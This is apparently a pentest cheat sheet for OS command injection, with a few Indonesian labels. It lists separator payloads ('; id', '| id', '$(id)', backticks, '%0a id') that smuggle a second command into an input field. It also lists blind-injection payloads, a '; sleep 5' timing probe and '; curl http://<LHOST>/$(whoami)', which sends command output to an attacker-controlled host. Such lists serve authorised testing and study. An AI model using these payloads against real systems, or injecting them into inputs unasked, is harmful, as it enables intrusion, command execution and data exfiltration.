# Command Injection

## Separator (sisipkan setelah input)
```text
; id        | id        || id        & id        && id
`id`        $(id)
%0a id                              # newline
;id;        |id|
```

## Blind (no output)
Exfil via DNS/HTTP atau time-based:
```bash
; sleep 5
; curl http://<LHOST>/$(whoami)
```
